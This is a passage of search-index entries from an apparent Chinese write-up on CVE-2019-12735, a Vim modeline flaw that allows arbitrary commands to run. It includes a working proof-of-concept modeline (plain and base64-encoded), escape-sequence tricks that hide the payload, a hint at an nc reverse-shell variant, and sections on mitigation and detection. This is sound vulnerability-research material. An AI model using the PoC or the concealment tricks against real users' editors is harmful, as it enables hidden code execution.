            "text": "\u901a\u8fc7\u5728command-line mode\u4e0b\uff0c\u4f7f\u7528 !{cmd}\u6765\u6267\u884cshell\u547d\u4ee4  $ vim\n:!uname -a\n\nLinux ubuntu 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\n\nPress ENTER or type command to continue  # \u4e00\u4e2a\u53ef\u4ee5\u6267\u884cshell\u547d\u4ee4\u7684vim\u811a\u672c\n$ vim a.vim\n<i>\n:!uname -a\n~\n~\n<ESC>\n:source %\n\n... Darwin Kernel Version 18.2.0: Thu Dec 20 20:46:53 PST 2018; root:xnu-4903.241.1~1/RELEASE_X86_64 x86_64\n\nPress ENTER or type command to continue\n\n# \u7279\u6b8a\u7684\u51fd\u6570execute\n# $ vim\n# :help execute()\n#  execute({command} [, {silent}])                                 *execute()*\n#                 Execute an Ex command or commands and return the output as a\n#                 string. \n#                 {command} can be a string or a List.  In case of a List the\n#                 lines are executed one by one. \n# ...\n\n#                 The optional {silent} argument can have these values:\n#                         \"\"              no `:silent` used\n#                         \"silent\"        `:silent` used\n#                         \"silent!\"       `:silent!` used\n#                               The default is \"silent\".  \n#                               Note that with \"silent!\", unlike `:redir`, error messages are dropped\n# ...\n\n\n$ vim b.vim\n: call execute(\"source a.vim\", \"\")\n\n\n... Darwin Kernel Version 18.2.0: Thu Dec 20 20:46:53 PST 2018; root:xnu-4903.241.1~1/RELEASE_X86_64 x86_64\n\n\nPress ENTER or type command to continue\n\n\n# execute\u51fd\u6570\u5728ubuntu\u4e0a\u5b89\u88c5\u7684Vim\u4e2d\u6ca1\u6709\uff0c\u4f46\u662f\u8fd8\u6709\u53e6\u4e00\u4e2a\u53ef\u4ee5\u6267\u884cshell\u547d\u4ee4\uff1aassert_fails()\n# $ vim\n# :help assert_fails\n# \n# assert_fails({cmd} [, {error}])                                 *assert_fails()*\n#                 Run {cmd} and add an error message to |v:errors| if it does\n#                 NOT produce an error.\n#                 When {error} is given it must match in |v:errmsg|.\n$ vim b.vim\n: call assert_fails(\"source a.vim\")\n\n\n... Darwin Kernel Version 18.2.0: Thu Dec 20 20:46:53 PST 2018; root:xnu-4903.241.1~1/RELEASE_X86_64 x86_64\n\n\nPress ENTER or type command to continue",
            "title": "vim\u6267\u884cshell\u547d\u4ee4"
        },
        {
            "location": "/cve-2019-12735-01/#silent",
            "text": "# :help silent\n#                              *:sil* *:silent* *:silent!*\n# :sil[ent][!] {command}  \n#    Execute {command} silently.  \n#    Normal messages will not\n#    be given or added to the message history.\n#    When [!] is added, error messages will also be\n#    skipped, and commands and mappings will not be aborted\n#    when an error is detected.\n\n\n\n# 1. \u7f16\u5199\u4e00\u4e2a\u6587\u4ef6\uff0c\u4e0d\u4f7f\u7528silent\uff0c\u4fdd\u5b58\u540e\u4f1a\u5728\u5e95\u90e8\u51fa\u73b0\u56de\u663e\u4fe1\u606f\nvim 1.txt\ni\nsomething \n~                                                                      ...     \n~       \n<ESC>\n:w                                                                   \n\"a.vim\" 1L, 11C written\n\n# 2. \u4f7f\u7528silent\uff0cw\u547d\u4ee4\u7684\u56de\u663e\u4fe1\u606f\u5c31\u6d88\u5931\u4e86\nvim 1.txt\ni\nsomenthing\n~                                                                       ...   \n~                                                                               \n:silent! w\n\n# 3. silent! \u53ef\u4ee5\u7528\u6765\u53bb\u9664\u9519\u8bef\u4fe1\u606f\nvim 1.txt\ni\nsomething\n<ESC>\n:w\n:file | silent! Anycommand or anytext'\\' \\; \"\n\nsomething\n~                                                                      ...\n~                                                                                                                                           \n\"1.vim\" line 1 of 1 --100%-- col 9",
            "title": "silent\u547d\u4ee4"
        },
        {
            "location": "/cve-2019-12735-01/#redraw",
            "text": "# :help redraw!\n#                                             *:redr*  *:redraw*\n# :redr[aw][!]            \n#  Redraw the screen right now.  \n#  When ! is included it is cleared first.\n#                         ... \n# \u7acb\u523b\u5237\u65b0\u5c4f\u5e55\uff0c\u5982\u679c\u8bbe\u7f6e\u4e86!\u5219\u5148\u6e05\u9664\u5c4f\u5e55\u5185\u5bb9\n# \u6bcf\u6761\u547d\u4e86\u6267\u884c\u5b8c\uff0c\u5e95\u90e8\u4f1a\u7559\u4e0b\u5386\u53f2\u8bb0\u5f55\uff0c redraw!\u4f1a\u6e05\u9664\u6389\u8bb0\u5f55\n\n# \u5c4f\u5e55\u4f1a\u6e05\u7a7a\nvim 1.txt\ni\nsomenthing\n~                                                                       ...   \n~                                                                               \n:silent! w\n:redraw!\n\nsomething\n~                                                                       ...\n~",
            "title": "redraw\u547d\u4ee4"
        },
        {
            "location": "/cve-2019-12735-01/#file",
            "text": "# \u8f93\u5165\u5f53\u524d\u6587\u4ef6\u4fe1\u606f\nvim 1.txt\ni\nsomething\n<ESC>\n:w\n:file\nsomething\n~                                                                      ...\n~                                                                                                                                           \n\"1.vim\" line 1 of 1 --100%-- col 9",
            "title": "file\u547d\u4ee4"
        },
        {
            "location": "/cve-2019-12735-01/#system",
            "text": "system({expr} [, {input}])                              *system()* *E677*\nGet the output of the shell command {expr} as a string.  \n... \n\n$ vim\n:let a = system('pwd')\n:echo a\n\n~                                                                      \n/home/invincible/Desktop/test/vim_test\n\nPress ENTER or type command to continue",
            "title": "system\u51fd\u6570"
        },
        {
            "location": "/cve-2019-12735-01/#assert_fails",
            "text": "\u6267\u884c\u4e00\u4e2avim command, \u5982\u679c\u6ca1\u6709\u51fa\u9519\uff0c\u5219\u5c06command\u7684\u6267\u884c\u4fe1\u606f\u4fdd\u5b58\u5230v:errors\u5168\u5c40\u53d8\u91cf\u4e2d  :help assert_fails\n\nassert_fails({cmd} [, {error}])                                \n  Run {cmd} and add an error message to |v:errors| \n  if it does NOT produce an error.\n  When {error} is given it must match in |v:errmsg|.  $ vim\n:call assert_fails(\"echo 'hello'\")\n\n~\n...\n~\nhello\n\n:echo v:errors\n['command did not fail: echo ''hello''']  \u7f16\u5199\u4e00\u4e2a\u53ef\u4ee5\u6267\u884cshell\u547d\u4ee4\u7684vim\u811a\u672c  \n$ vim a.vim\n<i>\n:!uname -a\n~\n~\n<ESC>\n:wq\n\n# \u7528assert_faild\u6267\u884cvim\u7684source\u6307\u4ee4\uff0c\u52a0\u8f7dvim\u811a\u672ca.vim\n$ vim\n:call assert_fails(\"source a.vim\")\n\nLinux ubuntu 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\n\nPress ENTER or type command to continue\n\n:echo v:errormsg\n['command did not fail: source a.vim']",
            "title": "assert_fails\u51fd\u6570"
        },
        {
            "location": "/cve-2019-12735-01/#vimfolding",
            "text": "vim\u7684folding\u529f\u80fd\u7528\u4e8e\u5bf9\u6587\u672c\u4e2d\u7684\u6587\u672c\u5757\uff08\u6bd4\u5982\u4e00\u4e2a\u51fd\u6570\uff0c\u4e00\u6bb5\u6ce8\u91ca\uff09\u6298\u53e0\u548c\u5c55\u5f00\uff0c\u53ef\u4ee5\u7c7b\u6bd4\u4e3a\u56fe\u5f62\u5316\u7f16\u8f91\u5668\u7f16\u8f91\u533a\u4fa7\u680f\u7684(+/-)\u3002    foldmethod\u9009\u9879\u662f\u7528\u6765\u914d\u7f6eVim\u7684\u4ee3\u7801\u6298\u53e0\u529f\u80fd\u7684\uff0cVim\u7ed9\u51fa\u4e86manual, indent, expr, syntax, diff, marker\u8fd9\u51e0\u79cd\u4ee3\u7801\u6298\u53e0\u7684\u65b9\u5f0f\uff0c\u4e0b\u9762\ud83d\udc47\u662findent\u65b9\u5f0f\u7684\u6548\u679c\uff1a    ```shell\n  # \u6587\u672c\u5982\u4e0b\n  $ vim a.py  # python3\n  # coding=utf-8\n  import platform  def func1():\n          for i in range(10):\n                  print(\"hello vim\")\n                  print(platform.platform())  def main():\n          func1()  main()  # 1. \u8bbe\u7f6efoldmethod\u9009\u9879\n  :set foldenable\n  :set foldmethod=indent  # \u6548\u679c\u5982\u4e0b\n  # python3\n  # coding=utf-8\n  import platform  def func1():\n  +--  3 lines: for i in range(10):-------------------------------------  def main():\n          func1()  main()  ```  \u5982\u679c\u4e0d\u6ee1\u8db3\u4e8e\u7ed9\u5b9a\u7684\u51e0\u79cd\u65b9\u5f0f\uff0c\u53ef\u4ee5\u5c06foldmethod\u8bbe\u7f6e\u4e3aexpr\u6765\u81ea\u5b9a\u4e49\u4ee3\u7801\u5757\u7684\u7279\u5f81  ```shell\n  # \u6587\u672c\u5982\u4e0b\n  $ vim a.py  # python3\n  # coding=utf-8\n  import platform  def func1():\n          for i in range(10):\n                  print(\"hello vim\")\n                  print(platform.platform())  def main():\n          func1()  main()  :set foldenable\n  :set foldmethod=expr\n  :set foldexpr=getline(v:lnum)[0]==\\\"#\\\"\n  # foldexpr\u7528\u4e8e\u8bbe\u7f6e\u6587\u672c\u6ee1\u8db3\u7684\u6761\u4ef6\uff0c\u6ee1\u8db3\u6761\u4ef6\u7684\u6587\u672c\u5757\u4f1a\u88ab\u6298\u53e0\n  # \u8be5\u914d\u7f6e\u7684\u610f\u601d\u662f\u901a\u8fc7Vim\u7684getline\u51fd\u6570\uff0c\u5224\u65ad\u6bcf\u4e00\u884c\u6587\u672c\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u662f\u5426\u4e3a\"#\"\uff0c\u5c06\u6ee1\u8db3\u6761\u4ef6\u7684\u76f8\u90bb\u7684\u884c\u89c6\u4e3a\u4e00\u4e2a\u6587\u672c\u5757\uff0c\u5e76\u5c06\u5176\u6298\u53e0\n  # \u6548\u679c\u5982\u4e0b:   +--  2 lines: # python3-----------------------------------------------\n  import platform  def func1():\n          for i in range(10):\n                  print(\"hello vim\")\n                  print(platform.platform())  def main():\n          func1()  main()  ```",
            "title": "Vim\u7684folding\u529f\u80fd"
        },
        {
            "location": "/cve-2019-12735-01/#vimsandbox",
            "text": "11. The sandbox                 *eval-sandbox* *sandbox* *E48*\n\n\nThe 'foldexpr', 'formatexpr', 'includeexpr', 'indentexpr', 'statusline' and\n'foldtext' options may be evaluated in a sandbox. \n\n\nThis gives some safety for when these options are set from a modeline.  \n\n\nThese items are not allowed in the sandbox:\n    - changing the buffer text\n    - defining or changing mapping, autocommands, functions, user commands\n    - setting certain options (see |option-summary|)\n    - setting certain v: variables (see |v:var|)  *E794*\n    - executing a shell command\n    - reading or writing a file\n    - jumping to another buffer or editing a file\n    - executing Python, Perl, etc. commands",
            "title": "vim\u7684sandbox\u6982\u5ff5"
        },
        {
            "location": "/cve-2019-12735-01/#ansi-escape-codes",
            "text": "\u53c2\u8003\uff1a  https://www.gnu.org/software/screen/manual/html_node/Control-Sequences.html\nhttps://notes.burke.libbey.me/ansi-escape-codes/\nhttps://learnku.com/articles/26231",
            "title": "ANSI escape codes"
        },
        {
            "location": "/cve-2019-12735-01/#x1b1g",
            "text": "\\x1b[1G \u5149\u6807\u79fb\u52a8\u5230\u5f53\u524d\u884c\u7684\u7b2cPn\u4e2a\u4f4d\u7f6e  # ESC [ Pn G                      Cursor horizontal position\n# $ echo -e \"Hello\\x1b[1GA\" > a.txt\n# $ cat a.txt\n# Aello\n# $ echo -e \"Hello\\x1b[2GA\" > a.txt\n# $ cat a.txt\n# HAllo\n# $ echo -e \"Hello\\x1b[3GA\" > a.txt\n# $ cat a.txt\n# HeAlo",
            "title": "\\x1b[1G"
        },
        {
            "location": "/cve-2019-12735-01/#x1bd",
            "text": "\\x1b[D \u5149\u6807\u5de6\u79fb1\u4e2a\u4f4d\u7f6e  # ESC [ Pn D                      Cursor Left\n# \u5149\u6807\u5de6\u79fbPn\u4e2a\u4f4d\u7f6e\n# $ echo -e \"Hello\\x1b[D\" > a.txt\n# $ cat a.txt\n# Hello\n# $ echo -e \"Hello\\x1b[D\\x1b[D\\x1b[DAAA\" > a.txt\n# $ cat a.txt\n# HeAAA\n# $ echo -e \"Hello\\x1b[5DAAA\" > a.txt\n# $ cat a.txt\n# AAAlo",
            "title": "\\x1b[D"
        },
        {
            "location": "/cve-2019-12735-01/#x1bk",
            "text": "\\x1b[K \u6e05\u9664\u5149\u6807\u5230\u5f53\u524d\u4f4d\u7f6e\u7684\u5185\u5bb9  # *  ESC [ K           erase to end of line (inclusive)\n# \u6e05\u9664\u5149\u6807\u5230\u5f53\u524d\u4f4d\u7f6e\u7684\u5185\u5bb9(\u4e0d\u4f1a\u6539\u53d8\u6587\u672c)\uff0c\u53ef\u4ee5\u914d\u5408\\x1b[G\u4f7f\u7528\n$ echo -e \"AAAA\\x1b[1G\\x1b[KBBBB\" > a.txt\n$ cat  a.txt\nBBBB\n$ echo -e \"ABCD\\x1b[2G\\x1b[KEEEE\" > a.txt\n$ cat  a.txt\nAEEEE\n$ echo -e \"ABCD\\x1b[3G\\x1b[KEEEE\" > a.txt\n$ cat a.txt \nABEEEE\n$ echo -e \"ABCD\\x1b[KEEEE\" > a.txt\n$ cat a.txt \nABCDEEEE",
            "title": "\\x1b[K"
        },
        {
            "location": "/cve-2019-12735-01/#x1b2k",
            "text": "",
            "title": "\\x1b[2K"
        },
        {
            "location": "/cve-2019-12735-01/#x1b7l",
            "text": "ESC [ ? 7 l       auto wrap off     \\x1b[?7l \u5173\u95ed\u81ea\u52a8\u6362\u884c (l -> low)    \\x1b[?7h \u5f00\u542f\u81ea\u52a8\u6362\u884c (h -> high)   \u8fd9\u4e2a\u547d\u4ee4\u7684\u529f\u80fd\u662f\u63a7\u5236Terminal\u7684\u663e\u793a\u529f\u80fd\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5982\u679c\u6587\u672c\u957f\u5ea6\u8d85\u8fc7Terminal\u7684\u663e\u793a\u957f\u5ea6\uff0c\u5219\u4f1a\u81ea\u52a8\u6362\u884c\uff0c\u5982\u679c\u5173\u95ed\u4e86\u81ea\u52a8\u6362\u884c\uff0c\u5219\u4f1a\u5168\u90e8\u663e\u793a\u5728\u4e00\u884c\uff0c\u8d85\u51fa\u7684\u90e8\u5206\u88ab\"\u622a\u65ad\"   \u200b                 \\x1b[?7l \u548c \\x1b[1G \u914d\u5408\u4f7f\u7528\u7684\u6548\u679c\uff1a  \u4f7f\u7528\u524d \uff1a                       \u4f7f\u7528\u540e\uff1a          \\x1b[?7l \u548c \\x1b[1G + \\x1b[K \u914d\u5408\u4f7f\u7528\u7684\u6548\u679c\uff1a",
            "title": "\\x1b[?7l"
        },
        {
            "location": "/cve-2019-12735-01/#x16",
            "text": "\u53c2\u8003:  http://defindit.com/ascii.html\nhttps://zh.wikipedia.org/wiki/%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6  \u8fd9\u662f\u4e00\u4e2aascii\u7801\u7684\u63a7\u5236\u5b57\u7b26\uff0c\u4ee3\u8868 ctrl+v\uff0c\u5b83\u7684\u529f\u80fd\u53ef\u4ee5\u7406\u89e3\u4e3a\uff1a\u8ba9\u4e0b\u4e00\u4e2a\u8f93\u5165\u8bc6\u522b\u4e3a\u666e\u901a\u5b57\u7b26  $ cat a.py\na = input(\"> \")\nprint(ord(a[0]))\n\n$ python3 a.py\n# \u60f3\u76f4\u63a5\u8f93\u5165ctrl+c, \u4f46\u7a0b\u5e8f\u9000\u51fa\uff0c\u88ab\u8bc6\u522b\u6210\u4e86\u4e2d\u65ad\u4fe1\u53f7\n> ^CTraceback (most recent call last):\n  File \"a.py\", line 1, in <module>\n    a = input(\"> \")\nKeyboardInterrupt\n\n$ python3 a.py\n# \u4f9d\u6b21\u6309\u4e0bctrl+v\u548cctrl+c, \u5c31\u987a\u5229\u6253\u5370\u51fa\u4e86ctrl+c\u7684ascii\u7801\n> ^C\n3  \u4e3a\u4ec0\u4e48Exp\u4e2d\u9700\u8981\\x16\u63a7\u5236\u5b57\u7b26  echo -e \"iHello\\x1b[D\" > a.vim\n$ vim \n:source! a.vim\n\nHello\n~                                                                      ...   \n~                                                                               \nE388: Couldn't find definition\n\n\u8fd9\u4e2a\u62a5\u9519\u53ef\u4ee5\u624b\u52a8\u8f93\u5165\u4e0b\u9762\u7684\u6307\u4ee4\u4ea7\u751f\uff1a\n$ vim\ni\nHello\n<ESC>\n[\nshift+d\n\n# \u5982\u679c\u52a0\u4e0a\\x16\u5219\\x1b\u4e0d\u4f1a\u88ab\u89e3\u6790\u6210<ESC>\u6309\u952e\uff0c\u800c\u662f\u8f93\u5165\u5b57\u7b26\necho -e \"iHello\\x16\\x1b[D\" > a.vim\n\nHello^[[D\n~                                                                      ...\n~\n\n-- INSERT --",
            "title": "\\x16"
        },
        {
            "location": "/cve-2019-12735-01/#exp",
            "text": "nc -> nc.traditional    Ubuntu\u4e0a\u7684nc\u4e0d\u5305\u542b-e\u9009\u9879\uff0c\u89e3\u51b3\u529e\u6cd5\u662f\u5b89\u88c5nc.traditional\u6765\u66ff\u4ee3nc\u547d\u4ee4   \\x1b[K -> \\x1b[2K \u548c \\x1b[D -> \\x1b[2D \u548c\u7a7a\u683c\u662f\u7528\u4e8e\u6e05\u9664\u4e0d\u53ef\u89c1\u5b57\u7b26\\x16\u548c\u5f15\u53f7   \u4fee\u6539\u524d:   \u200b          \u200b                         \u4fee\u6539\u540e:",
            "title": "exp\u4fee\u6539\u8bf4\u660e"
        },
        {
            "location": "/cve-2019-12735-01/#vim_2",
            "text": "",
            "title": "Vim\u5b89\u88c5"
        },
        {
            "location": "/cve-2019-12735-01/#apt",
            "text": "apt-get install vim-runtime=2:7.4.1689-3ubuntu1\napt-get install vim-common=2:7.4.1689-3ubuntu1\napt-get install vim=2:7.4.1689-3ubuntu1",
            "title": "apt\u81ea\u52a8\u5b89\u88c5"
        },
        {
            "location": "/cve-2019-12735-01/#deb",
            "text": "\u94fe\u63a5:https://pan.baidu.com/s/1rn0RqwWn0tpgk9PY0v00Jw \u5bc6\u7801:m0qc  sudo dpkg -i vim_2%3a7.4.1689-3ubuntu1_amd64.deb",
            "title": "\u4f7f\u7528deb\u5305\u5b89\u88c5"
        },
        {
            "location": "/cve-2019-12735-01/#_2",
            "text": "# \u4e0b\u8f7d\u6e90\u7801\uff0c\u7f16\u8bd1\u751f\u6210\u7b26\u53f7\n# \u53c2\u8003\uff1ahttps://www.unix.com/programming/156665-compile-debug-vim-source-code.html\n$ mkdir ~/MyVim\n$ cd ~/MyVim\n$ sudo apt-get install libncurses5-dev libncursesw5-dev\n$ apt-get source vim=2:7.4.1689-3ubuntu1\n$ cd src\n$ cp Makefile Makefile.orig\n$ vim Makefile\n$ diff Makefile Makefile.orig\n540c540\n< CFLAGS = -g\n---\n> #CFLAGS = -g\n908c908\n< prefix = ~/MyVim\n---\n> #prefix = $(HOME)\n1852c1852\n< #    $(STRIP) $(DEST_BIN)/$(VIMTARGET)\n---\n>     $(STRIP) $(DEST_BIN)/$(VIMTARGET)\n$ cd ..\n$ make && make install\n$ cd bin\n$ gdb ./vim",
            "title": "\u4e0b\u8f7d\u6e90\u7801\u624b\u52a8\u7f16\u8bd1"
        },
        {
            "location": "/cve-2019-12735-01/#docker",
            "text": "\u53ef\u4ee5\u901a\u8fc7Docker\u5feb\u901f\u642d\u5efapoc\u590d\u73b0\u73af\u5883  $ ls\nDockerfile\n$ cat Dockerfile\nFrom ubuntu:16.04\nRUN set -e -x ;\\\n    apt update ;\\\n    apt-get install -y vim-runtime=2:7.4.1689-3ubuntu1 ;\\\n    apt-get install -y vim-common=2:7.4.1689-3ubuntu1 ;\\\n    apt-get install -y vim=2:7.4.1689-3ubuntu1 ;\\\n    echo \"OiF1bmFtZSAtYXx8IiB2aTpmZW46ZmRtPWV4cHI6ZmRlPWFzc2VydF9mYWlscygic291cmNlXCFcIFwlIik6ZmRsPTA6ZmR0PSIK\" | base64 --decode > /root/poc.txt \n\n$ sudo docker build -t vim-cve-2019-12735 .\n$ sudo docker run -it vim-cve-2019-12735 /bin/bash\necho -e \"set modeline\\nset modelines=5\" > ~/.vimrc \ncd root\nvim poc.txt",
            "title": "Docker\u590d\u73b0\u73af\u5883\u642d\u5efa"
        },
        {
            "location": "/cve-2019-12735-01/#_3",
            "text": "",
            "title": "\u6f0f\u6d1e\u9632\u62a4"
        },
        {
            "location": "/cve-2019-12735-01/#package",
            "text": "\u67e5\u770b\u53ef\u5b89\u88c5\u7684Vim\u7248\u672c   # \u67e5\u770b\u53ef\u5b89\u88c5\u7684Vim\u7248\u672c\n$ apt-cache policy vim\nvim:\n  Installed: (none)\n  Candidate: 2:7.4.1689-3ubuntu1.4\n  Version table:\n     2:7.4.1689-3ubuntu1.4 500\n        500 https://mirrors.tuna.tsinghua.edu.cn/ubuntu xenial-updates/main amd64 Packages\n        500 https://mirrors.tuna.tsinghua.edu.cn/ubuntu xenial-security/main amd64 Packages\n     2:7.4.1689-3ubuntu1 500\n        500 https://mirrors.tuna.tsinghua.edu.cn/ubuntu xenial/main amd64 Packages\n\n# \u4eceVim\u5305\u7684changelog\u4e2d\u83b7\u53d6\u4fee\u590d\u6f0f\u6d1e\u7684\u7248\u672c\u53f7 2:7.4.1689-3ubuntu1.3\n$ cat vim_changelog.txt |grep CVE-2019-12735 -C 10\n...\nvim (2:7.4.1689-3ubuntu1.3) xenial-security; urgency=medium\n\n  * SECURITY UPDATE: Arbitrary code execution\n    - debian/patches/CVE-2019-12735.patch: disallow\n      sourcing a file in the sandbox in src/getchar.c\n    - CVE-2019-12735\n  * SECURITY UPDATE: Buffer overflow\n    - debian/patches/CVE-2017-5953.patch: check for an\n      invalid length in order to avoid a overflow in\n      src/spell.c.\n    - CVE-2017-5953\n\n\n -- Leonidas S. Barbosa <leo.barbosa@canonical.com>  Fri, 07 Jun 2019 12:35:43 -0300   \u5b89\u88c5\u5b58\u5728\u6f0f\u6d1e\u7684\u7248\u672c   \n$ sudo apt install vim-common=2:7.4.1689-3ubuntu1\n$ sudo apt install vim-runtime=2:7.4.1689-3ubuntu1\n$ sudo apt install vim=2:7.4.1689-3ubuntu1\n\n# \u901a\u8fc7apt-cache \u67e5\u770b\u5df2\u5b89\u88c5\u7684\u7248\u672c < 2:7.4.1689-3ubuntu1.3\n$ apt-cache policy vim:\n  Installed: 2:7.4.1689-3ubuntu1\n  Candidate: 2:7.4.1689-3ubuntu1.4\n  ...\n\n# \u914d\u7f6evimrc\u5f00\u542fmodeline\u529f\u80fd\nvim ~/.vimrc\ni\nset modeline\nset modelines=5\n<ESC>\n:w\n\n# \u6d4b\u8bd5\u6548\u679c\n$ vim poc.txt\n\nLinux ubuntu 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux\n\n\nPress ENTER or type command to cont   \u5b89\u88c5\u6700\u65b0\u7248\u672c\u7684vim   # \u5b89\u88c5\u6700\u65b0\u7248\u672c\u7684vim\n$ sudo apt install vim\n\n# \u901a\u8fc7apt-cache \u67e5\u770b\u5df2\u5b89\u88c5\u7684\u7248\u672c > 2:7.4.1689-3ubuntu1.3\n$ apt-cache policy vim\nvim:\n  Installed: 2:7.4.1689-3ubuntu1.4\n  Candidate: 2:7.4.1689-3ubuntu1.4\n  ...\n\n# \u914d\u7f6evimrc\u5f00\u542fmodeline\u529f\u80fd\nvim ~/.vimrc\ni\nset modeline\nset modelines=5\n<ESC>\n\n\n# \u6d4b\u8bd5\u6548\u679c\uff0c\u672a\u89e6\u53d1\u6f0f\u6d1e\n$ vim poc.txt\n:!uname -a||\" vi:fen:fdm=expr:fde=assert_fails(\"source\\!\\ \\%\"):fdl=0:fdt=\"\n~                                                                      ...                                                                    \n~                                                                               \n\"poc.txt\" 1L, 75C",
            "title": "package\u7248\u672c\u68c0\u67e5"
        },
        {
            "location": "/cve-2019-12735-01/#_4",
            "text": "# \u68c0\u67e5modeline\u914d\u7f6e:\n$ vim\n:verbose set modeline? \n:verbose set modelines?\n# \u5982\u679c\u663e\u793anomodeline, nomodelines\u8868\u793a\u6ca1\u6709\u914d\u7f6e\n\n# \u5982\u679c\u914d\u7f6e\u4e86\uff0c\u5219\u4f1a\u663e\u793a\uff1a\n\n...\n\uff5e                                                                 \n  modeline\n        Last set from ~/.vimrc\nPress ENTER or type command to continue\n\n...\n\uff5e\n  modelines=5\n        Last set from ~/.vimrc\nPress ENTER or type command to continue\n\n# \u5173\u95edmodeline\u914d\u7f6e\nvim ~/.vimrc\n\u5220\u9664\nset modeline\nset modelines=5\n\u6dfb\u52a0\nset nomodeline\n:wq\n\n# \u518d\u6b21\u68c0\u67e5\n$ vim\n:verbose set modeline? \n\n~                                                                     \nnomodeline\n        Last set from ~/.vimrc\nPress ENTER or type command to continue",
            "title": "\u914d\u7f6e\u68c0\u67e5"
        },
        {
            "location": "/cve-2019-12735-01/#poc",
            "text": "\u8bfb\u53d6stdout  \u4ee3\u7801\u6267\u884cvim\u6253\u5f00poc\u8bfb\u53d6stdout\u6839\u636e\u8f93\u51fa\u5224\u65ad(\u76ee\u524d\u7684\u6765\u770b\uff0c\u83b7\u53d6vim\u7684\u8f93\u51fa\u8c8c\u4f3c\u6709\u4e9b\u9ebb\u70e6)  \u4e0d\u5b58\u5728\u6f0f\u6d1e\u65f6\u91cd\u5b9a\u5411stdout:   $ vim poc.txt >out.txt\nVim: Warning: Output is not to a terminal\n$ cat out.txt \n# \u5185\u5bb9\u4e3a\u7a7a   \u5b58\u5728\u6f0f\u6d1e\u65f6\u91cd\u5b9a\u5411stdout:   $ vim poc.txt > out.txt\nVim: Warning: Output is not to a terminal\n\nPress ENTER or type command to continue\n\n$ cat out.txt \nLinux ubuntu 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux  \u68c0\u67e5\u8c03\u7528\u6808  \u7c7b\u4f3c\u7684\uff0c\u901a\u8fc7\u4ee3\u7801\u6267\u884cvim\u6253\u5f00poc\uff0cptrace\u8c03\u7528\u6808\uff0c\u68c0\u67e5\u662f\u5426\u6709do_shell\u8c03\u7528\u65e0\u6f0f\u6d1e\u65f6\u6b63\u5e38\u6253\u5f00poc\u6587\u4ef6\u540e\u7684\u8c03\u7528\u6808\uff1a  gdb-peda$ bt\n#0  0x00007fca6f40b5b3 in __select_nocancel ()\n#1  0x000000000052a69c in RealWaitForChar (fd=0x0, \n#2  0x000000000052a444 in WaitForCharOrMouse \n#3  0x000000000052a393 in WaitForChar (msec=0xffffffffffffffff)\n#4  0x0000000000526147 in mch_inchar (buf=0x86c66a <typebuf_init+42> \n#5  0x00000000005c381e in ui_inchar (buf=0x86c66a <typebuf_init+42> \n#6  0x00000000004ad1fe in inchar (buf=0x86c66a <typebuf_init+42> \"\", \n#7  0x00000000004ace26 in vgetorpeek (advance=0x1) at getchar.c:2832\n#8  0x00000000004ab07e in vgetc () at getchar.c:1605\n#9  0x00000000004ab526 in safe_vgetc () at getchar.c:1801\n#10 0x00000000004f8512 in normal_cmd (oap=0x7ffefbcad0c0, \n#11 0x00000000005e96fb in main_loop (cmdwin=0x0, noexmode=0x0) at \n#12 0x00000000005e90e3 in main (argc=0x2, argv=0x7ffefbcad3b8) at \n...  \u5b58\u5728\u6f0f\u6d1e\u65f6\uff0c\u6253\u5f00poc\u6587\u4ef6\u540e\u7684\u8c03\u7528\u6808\uff0c\u6709\u4e00\u4e2a\u660e\u663e\u7684do_shell\u7684\u8c03\u7528:  gdb-peda$ bt\n#0  0x00007f4ba14135b3 in __select_nocancel ()\n#1  0x000000000052a69c in RealWaitForChar (fd=0x0, \n#2  0x000000000052a444 in WaitForCharOrMouse \n#3  0x000000000052a393 in WaitForChar (msec=0xffffffffffffffff)\n#4  0x0000000000526147 in mch_inchar (buf=0x86c66a <typebuf_init+42> \n#5  0x00000000005c381e in ui_inchar (buf=0x86c66a <typebuf_init+42> \n#6  0x00000000004ad1fe in inchar (buf=0x86c66a <typebuf_init+42> \"\", \n#7  0x00000000004ace26 in vgetorpeek (advance=0x1) at getchar.c:2832\n#8  0x00000000004ab07e in vgetc () at getchar.c:1605\n#9  0x00000000004ab526 in safe_vgetc () at getchar.c:1801\n#10 0x00000000004ce972 in wait_return (redraw=0x1) at message.c:901\n#11 0x000000000045ce32 in do_shell (\n    cmd=0x15c7ea0 \"uname -a||\\\" vi:fen:fdm=expr:fde=assert_fails(\\\"source!\\\\ %\\\"):fdl=0:fdt=\\\"\", flags=0x0) at ex_cmds.c:1572\n#12 0x000000000045c50c in do_bang (addr_count=0x0, \n#13 0x000000000047f480 in ex_bang (eap=0x7ffe20228c50) at \n#14 0x00000000004741d3 in do_one_cmd (cmdlinep=0x7ffe20228d80, \n#15 0x0000000000470d89 in do_cmdline (cmdline=0x0, \n#16 0x00000000005002cd in nv_colon (cap=0x7ffe202293f0) at \n#17 0x00000000004f9650 in normal_cmd (oap=0x7ffe20229480, \n#18 0x00000000005e96fb in main_loop (cmdwin=0x0, noexmode=0x0) at \n#19 0x00000000005e90e3 in main (argc=0x2, argv=0x7ffe20229778) at",
            "title": "poc\u9a8c\u8bc1"
        },
        {
            "location": "/cve-2019-12735/",
